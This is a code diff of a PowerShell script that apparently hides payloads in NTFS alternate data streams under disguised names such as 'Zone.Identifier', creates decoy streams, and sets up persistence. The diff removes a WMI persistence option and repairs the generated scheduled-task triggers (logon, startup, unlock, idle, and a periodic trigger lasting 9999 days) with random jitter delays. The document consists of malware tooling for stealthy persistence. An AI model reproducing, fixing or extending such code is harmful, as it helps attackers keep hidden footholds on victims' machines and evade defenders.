@@ -34,7 +34,7 @@
     Prefix for hybrid mode (e.g., 'Zone.Identifier')
 
 .PARAMETER Persist
-    'task', 'registry', 'wmi', or 'none'
+    'task', 'registry', or 'none'
 
 .PARAMETER CreateDecoys
     Number of decoy streams (0-10)
@@ -80,7 +80,7 @@ param(
     
     [string]$HybridPrefix,
     
-    [ValidateSet('task', 'registry', 'wmi', 'none')]
+    [ValidateSet('task', 'registry', 'none')]
     [string]$Persist = 'task',
 
     [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
@@ -568,25 +568,30 @@ function Build-TriggerBlock {
         switch ($t) {
             'AtLogOn' {
                 $code += "`$_t=New-ScheduledTaskTrigger -AtLogOn`n"
+                # MSFT_TaskLogonTrigger uses 'Delay' with ISO 8601 string, not 'RandomDelay'
                 if ($jitterMinutes -gt 0) {
-                    $code += "`$_t.RandomDelay=(New-TimeSpan -Minutes $jitterMinutes)`n"
+                    $code += "`$_t.Delay='PT${jitterMinutes}M'`n"
                 }
                 $code += "`$_triggers+=`$_t`n"
             }
             'AtStartup' {
                 $code += "`$_t=New-ScheduledTaskTrigger -AtStartup`n"
+                # MSFT_TaskBootTrigger uses 'Delay' with ISO 8601 string, not 'RandomDelay'
                 if ($jitterMinutes -gt 0) {
-                    $code += "`$_t.RandomDelay=(New-TimeSpan -Minutes $jitterMinutes)`n"
+                    $code += "`$_t.Delay='PT${jitterMinutes}M'`n"
                 }
                 $code += "`$_triggers+=`$_t`n"
             }
             'OnIdle' {
+                # MSFT_TaskIdleTrigger has no delay property; idle timing is in task settings
                 $code += "`$_triggers+=New-CimInstance -CimClass (Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler) -ClientOnly`n"
             }
             'OnUnlock' {
-                $code += "`$_tU=New-CimInstance -CimClass (Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler) -Property @{StateChange=[uint32]8} -ClientOnly # 8=SessionUnlock`n"
+                # MSFT_TaskSessionStateChangeTrigger uses 'Delay', set during CIM creation
                 if ($jitterMinutes -gt 0) {
-                    $code += "`$_tU.RandomDelay='PT${jitterMinutes}M'`n"
+                    $code += "`$_tU=New-CimInstance -CimClass (Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler) -Property @{StateChange=[uint32]8;Delay='PT${jitterMinutes}M'} -ClientOnly # 8=SessionUnlock`n"
+                } else {
+                    $code += "`$_tU=New-CimInstance -CimClass (Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler) -Property @{StateChange=[uint32]8} -ClientOnly # 8=SessionUnlock`n"
                 }
                 $code += "`$_triggers+=`$_tU`n"
             }
@@ -595,8 +600,9 @@ function Build-TriggerBlock {
 
     # Periodic trigger (always)
     $code += "`$_tP=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) -RepetitionDuration (New-TimeSpan -Days 9999)`n"
+    # RandomDelay also requires ISO 8601 string for Task Scheduler XML serialization
     if ($jitterMinutes -gt 0) {
-        $code += "`$_tP.RandomDelay=(New-TimeSpan -Minutes $jitterMinutes)`n"
+        $code += "`$_tP.RandomDelay='PT${jitterMinutes}M'`n"
     }
     $code += "`$_triggers+=`$_tP`n"
 
